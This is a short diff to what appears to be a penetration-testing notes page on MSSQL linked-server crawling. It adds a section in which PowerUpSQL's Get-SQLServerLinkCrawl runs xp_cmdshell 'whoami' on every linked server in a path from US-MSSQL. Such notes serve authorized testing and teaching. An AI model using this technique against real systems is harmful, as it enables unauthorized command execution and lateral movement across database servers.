@@ -40,4 +40,12 @@ Path : {US-MSSQL, 192.168.23.25}
 Path : {US-MSSQL, 192.168.23.25, DB-SQLSRV}
 ```
 
-This shows that from US-MSSQL, it is possible to access DB server 192.168.23.25. And from this DB server, it is possible to access DB server DB-SQLSRV
+This shows that from US-MSSQL, it is possible to access DB server 192.168.23.25. And from this DB server, it is possible to access DB server DB-SQLSRV.
+
+## Execute command
+
+Execute a command on each node of the path where xp\_cmdshell is enabled:
+
+```powershell
+> Get-SQLServerLinkCrawl -Instance us-mssql -Query 'exec master..xp_cmdshell ''whoami'''
+```
